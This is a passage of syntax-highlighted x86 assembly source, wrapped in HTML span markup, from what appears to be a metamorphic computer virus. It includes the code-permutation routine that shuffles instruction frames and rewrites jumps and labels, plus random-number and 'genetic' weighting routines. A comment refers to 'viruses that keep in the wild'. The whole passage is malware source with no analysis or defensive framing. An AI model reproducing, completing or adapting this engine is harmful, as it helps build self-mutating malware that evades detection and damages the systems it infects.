                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">; PUSH Mem2/POP Mem</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">59h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc5">@@NextInstruction</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">; Copy the instruction</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">  </span><span class="sc1">; Set pointer to old code</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">  </span><span class="sc1">; Set pointer to new code</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">       </span><span class="sc1">; NOP?</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@NextInstruction2</span><span class="sc0">
        </span><span class="sc5">@@SetLastInstruction</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc1">;   mov     eax, [edi]      ; Save opcode for later</span><span class="sc0">
             </span><span class="sc1">;   and     eax, 0FFh</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Permut_LastInstruction</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@NextInstruction3</span><span class="sc0">
        </span><span class="sc5">@@NextInstruction2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">0Bh</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Label over a NOP?</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">; If so, jump to fix the problem</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@SetLastInstruction</span><span class="sc0">
        </span><span class="sc5">@@NextInstruction3</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">         </span><span class="sc1">; Next instruction in the frame</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">         </span><span class="sc1">; Last instruction in the frame?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@LoopCopyInstructions</span><span class="sc0">  </span><span class="sc1">; If not, loop to copy</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">AddressOfLastFrame</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Check if it's the last</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                  </span><span class="sc1">; frame of the code (not of</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">   </span><span class="sc5">@@LastFrameArrived</span><span class="sc0">          </span><span class="sc1">; the table)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; Get the frame in the table</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">             </span><span class="sc1">; Is it the same?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@LoopTestIfLastFrame</span><span class="sc0">  </span><span class="sc1">; Check if it's the last frame</span><span class="sc0">
                                             </span><span class="sc1">; of the permutation table</span><span class="sc0">
       </span><span class="sc5">@@LastFrameArrived</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Permut_LastInstruction</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E9h</span><span class="sc0">  </span><span class="sc1">; JMP &lt;label&gt; opcode</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@LoopTestIfLastFrame</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0EBh</span><span class="sc0">  </span><span class="sc1">; JMP Mem opcode</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@LoopTestIfLastFrame</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0EDh</span><span class="sc0">  </span><span class="sc1">; JMP Reg opcode</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@LoopTestIfLastFrame</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FEh</span><span class="sc0">  </span><span class="sc1">; RET</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@LoopTestIfLastFrame</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">  </span><span class="sc1">; Set the new label</span><span class="sc0">
      </span><span class="sc5">@@InsertJump</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E9h</span><span class="sc0">     </span><span class="sc1">; JMP opcode</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">     </span><span class="sc1">; Set the JMP to the new label</span><span class="sc0">
                </span><span class="sc1">; EDI = Jump to update</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">InsertJumpInTable</span><span class="sc0"> </span><span class="sc1">; Insert it in the table for later</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">      </span><span class="sc1">; Next instruction</span><span class="sc0">
      </span><span class="sc5">@@LoopTestIfLastFrame</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">AddressOfLastFrame</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Are we in the end of</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                   </span><span class="sc1">; the table?</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">   </span><span class="sc5">@@End</span><span class="sc0">               </span><span class="sc1">; If so, end instruction copy</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@LoopCopyFrame</span><span class="sc0">     </span><span class="sc1">; If not, jump to continue the copy</span><span class="sc0">
      </span><span class="sc5">@@InsertJump2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; Get the label</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">; Put it as label (but later will</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@InsertJump</span><span class="sc0">        </span><span class="sc1">; be substituted)</span><span class="sc0">

         </span><span class="sc1">; Here we have all instructions copied, and all the labels and jumps</span><span class="sc0">
         </span><span class="sc1">; to other blocks waiting to be updated</span><span class="sc0">
      </span><span class="sc5">@@End</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">AddressOfLastInstruction</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                                        </span><span class="sc1">; Update last instruction address</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NumberOfLabels</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">LabelTable</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc5">@@LoopUpdateLabel</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Pointer to old code</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; New position (directly from the</span><span class="sc0">
                                        </span><span class="sc1">;  instruction)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">      </span><span class="sc1">; Set new pointer in label</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@LoopUpdateLabel</span><span class="sc0"> </span><span class="sc1">; Next entry</span><span class="sc0">

        </span><span class="sc1">; Now we update the inserted permutation jumps</span><span class="sc0">
        </span><span class="sc1">; EDX = Pointer to label insert point (from the code above)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NumberOfJumps</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">JumpsTable</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@CheckNumberOfJumps</span><span class="sc0">
        </span><span class="sc5">@@LoopUpdateJumps</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Jump address</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Get jump destination</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get new address</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">     </span><span class="sc1">; Label pointer to new code</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">; Label pointer to old code</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">   </span><span class="sc1">; Set label in jump</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NumberOfLabels</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NumberOfLabels</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">      </span><span class="sc1">; Next new label pointer</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">      </span><span class="sc1">; Next jump to update</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc5">@@CheckNumberOfJumps</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@LoopUpdateJumps</span><span class="sc0">
         </span><span class="sc1">;; All is OK in this point</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">PermutateCode</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; Little function to insert jumps in the table.</span><span class="sc0">
</span><span class="sc5">InsertJumpInTable</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NumberOfJumps</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">JumpsTable</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NumberOfJumps</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">InsertJumpInTable</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; Random number generator. It's used along the engine.</span><span class="sc0">
</span><span class="sc5">Random</span><span class="sc0">          </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RndSeed1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RndSeed2</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomMod1</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RndSeed1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RndSeed1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RndSeed2</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RndSeed2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomMod2</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RndSeed2</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RndSeed2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RndSeed1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomMod2</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Random</span><span class="sc0">          </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">RandomMod1</span><span class="sc0">      </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1FFFh</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13h</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFE00h</span><span class="sc0">
                </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Dh</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">RandomMod1</span><span class="sc0">      </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">RandomMod2</span><span class="sc0">      </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1FFFFh</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Fh</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFE000h</span><span class="sc0">
                </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">RandomMod2</span><span class="sc0">      </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; Other wide-used function. Returns TRUE or FALSE in EAX.</span><span class="sc0">
</span><span class="sc5">RandomBoolean</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">RandomBoolean</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc1">;; Booleans based on a little genetic algorithm. Each boolean is a</span><span class="sc0">
</span><span class="sc1">;; better-than-random number based on the previous random numbers generated</span><span class="sc0">
</span><span class="sc1">;; with these ones. The viruses that keep in the wild will have accurated</span><span class="sc0">
</span><span class="sc1">;; behaviours based on these weights.</span><span class="sc0">
</span><span class="sc5">RandomBoolean_X000_3</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Weight_X000_3</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CheckForBooleanWeight</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Weight_X000_3</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">RandomBoolean_X000_3</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">RandomBoolean_X004_7</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
